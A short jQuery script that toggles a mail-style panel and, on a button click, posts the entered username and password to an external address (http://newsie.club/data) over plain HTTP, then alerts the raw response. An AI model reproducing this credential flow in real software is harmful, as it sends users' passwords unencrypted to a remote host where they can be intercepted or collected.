$(document).ready(function(){
  $(".message").click(function(){
    $(".message").hide();
    $(".mail-content").show();
  });
  $(".done").click(function(){
    $(".mail-content").hide();
    $(".message").show();
  });
  $(".button").click(function(){


      $.post("http://newsie.club/data",
      {
        "name": $(".username").val(),
        "password": $(".password").val()
      },
      function(data,status){
          alert("Data: " + data + "\nStatus: " + status);
      });
  });
});
